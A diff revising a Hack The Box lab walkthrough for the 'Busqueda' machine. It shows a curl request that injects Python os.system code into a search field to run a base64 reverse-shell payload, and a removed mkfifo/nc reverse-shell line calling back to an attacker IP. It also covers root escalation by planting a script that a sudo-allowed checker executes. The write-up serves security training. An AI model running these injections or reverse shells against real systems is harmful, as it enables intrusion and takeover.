@@ -294,18 +294,18 @@ First, I'll setup a listener to receive the shell.
 ❯ rlwrap nc -lvnp "9001"
 ```
 
-Then, I'll choose the 'nc mkfifo' payload from
+Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
 [RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
 shell.
 
-I'll save the Base64 encoded version of it as the `COMMAND` shell variable.
+I'll save it as the `BASE64_REVSHELL_PAYLOAD` shell variable.
 
 ### Exploitation
 
 Let's send a request to Busqueda to execute our payload.
 
 ```sh
-❯ curl -s -o "/dev/null" "http://searcher.htb/search" -X "POST" -d "engine=Accuweather&query=',__import__('os').system('echo $COMMAND | base64 -d | bash -i'))#"
+❯ curl -s -o "/dev/null" "http://searcher.htb/search" -X "POST" --data-urlencode "engine=Accuweather" --data-urlencode "query=',__import__('os').system('/bin/echo $BASE64_REVSHELL_PAYLOAD | /usr/bin/base64 -d | /bin/bash -i'))#"
 ```
 
 If we check our listener:
@@ -560,6 +560,8 @@ busqueda
 
 Yeah I know, very surprising.
 
+## System enumeration
+
 ### Flags
 
 If we check our home folder, we find the user flag.
@@ -795,7 +797,7 @@ However, we find nothing new, it's the same as the version on the system.
 I tried to log in as `administrator` with the same password as `cody`, but it
 failed.
 
-## Getting a lay of the land
+## System enumeration
 
 ### Sudo permissions
 
@@ -1257,8 +1259,8 @@ script located in the current directory, and prints an error if it fails.
 
 Since we can execute `/opt/scripts/system-checkup.py` as `root` and that the
 `full-checkup` argument runs the `full-checkup.sh` script in the current
-directory as `root`, we simply have to create a `full-checkup.sh` to execute it
-as `root`!
+directory as `root`, we simply have to create a `full-checkup.sh` file to
+execute it as `root`!
 
 ### Preparation
 
@@ -1270,19 +1272,19 @@ First, I'll setup a listener to receive the shell.
 ❯ rlwrap nc -lvnp "9002"
 ```
 
-Then, I'll choose the 'nc mkfifo' payload from
+Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
 [RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
 shell.
 
 ### Exploitation
 
-Let's create a `full-checkup.sh` file int the current directory containing our
+Let's create a `full-checkup.sh` file in the current directory containing our
 payload:
 
 ```sh
 #!/bin/bash
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.10 9002 >/tmp/f
+/bin/echo <BASE64_REVSHELL_PAYLOAD> | /usr/bin/base64 -d | /bin/bash -i
 ```
 
 Then, let's make it executable.
@@ -1309,7 +1311,7 @@ create a private key and I'll add the corresponding key to `authorized_keys`.
 Finally I'll connect over SSH to Busqueda. This way, I'll have a much more
 stable shell.
 
-## Getting a lay of the land
+## System enumeration
 
 If we run `whoami`, we see that we're `root`!
 
